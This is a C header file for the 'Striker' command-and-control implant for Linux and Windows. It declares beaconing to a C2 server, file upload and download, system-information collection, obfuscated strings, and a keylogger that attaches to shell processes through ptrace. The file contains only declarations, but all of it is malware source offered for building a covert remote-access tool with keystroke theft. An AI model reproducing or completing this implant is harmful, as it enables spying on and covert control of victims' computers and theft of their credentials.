/**
 *--------------------------------------------------------------------
 * Header file for the Striker C2 implant for linux and windows hosts.
 *                                                  Author: Umar Abdul
 *--------------------------------------------------------------------
 */

#ifndef STRIKER_H
#define STRIKER_H

#ifdef __WIN32__
  #define IS_WINDOWS
  #include <windows.h>
  #include <wininet.h>
  #define PATH_MAX 256
#else
  #define IS_LINUX
#endif

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <dirent.h>
#include "cJSON.h"
#include "striker_utils.h"

#ifdef IS_LINUX
  #include <sys/user.h>
  #include <sys/wait.h>
  #include <sys/ptrace.h>
  #include <pthread.h>
  #include <curl/curl.h>
  #include <sys/select.h>
  #include <linux/input.h>
#endif

// A struct for tracking session info.
typedef struct{
  char *uid; // The ID of the agent.
  char *auth_key; // The key to use for authentication to the server.
  unsigned long delay; // Callback delay, in seconds.
  char *write_dir; // Full path to a writable directory.
  unsigned short abort; // Will be set to 1 if session need to be ended.
} session;

// A struct for representing a single task.
typedef struct{
  char *uid; // The ID of the task
  char *type; // The type of the task
  cJSON *data; // The data needed by the task
  unsigned short completed; // Indicates if the task has been completed.
  cJSON *result; // The result of the task.
  cJSON *input_json; // The cJSON object used to generate the task.
} task;

// A struct for passing session and task to task executor.
typedef struct{
  session *striker;
  task *tsk;
} task_wrapper;


// For decoding obfuscated strings.
char *obfs_decode(char *str);

// Used for parsing URL.
typedef enum {HTTP, HTTPS} URL_PROTO;

// Extract the protocol, hostname, port, and path of a URL.
void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path);

/**
 * Make a GET request to `url`, save response body to `body`, and return the status code.
 * If `url` starts with a "/", it will be treated as a relative path to the active C2 server.
 */
int http_get(char *url, buffer *body);

// Same as above, but for POST requests. `data` is the POST data (JSON), and response will be written to `body` 
int http_post(char *url, cJSON *data, buffer *body);

#ifdef IS_LINUX
  /**
   * Callback function for curl to receive response body inside a buffer.
   * This may be called multiple times with chunks of data, depending on the size of the body.
   */
  size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);

  // Callback function for curl to write response body to a file.
  size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
#endif

// Extract the host and port in a URL.
void get_url_host_port(char *url, char *host, int *port);

// Return a json object containing system information.
cJSON *sysinfo();

// Handles task for uploading file to server. Returns 1 on success.
short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);

// Download a file from `url` and save to `wfo`. Returns 1 on success.
short int download_file(char *url, FILE *wfo, buffer *result_buff);

// Starts the keylogger
void keymon(session *striker, task *tsk);

// Monitors processes and call keymon_proc_attach() to have the keylogged.
void *keymon_proc_watch(void *ptr);

// Called by keymon in bg thread for every shell process to be tapped.
void *keymon_proc_attach(void *ptr);

// Parse a task JSON and return it, NULL on error.
task *parse_task(cJSON *json);

// Free a task.
void free_task(task *tsk);

// Executes a task in a background thread.
void *task_executor(void *ptr);

// Starts the implant.
void start_session();

// Cleanup session. Called on exit.
void cleanup_session(session *striker);

#endif // STRIKER_H
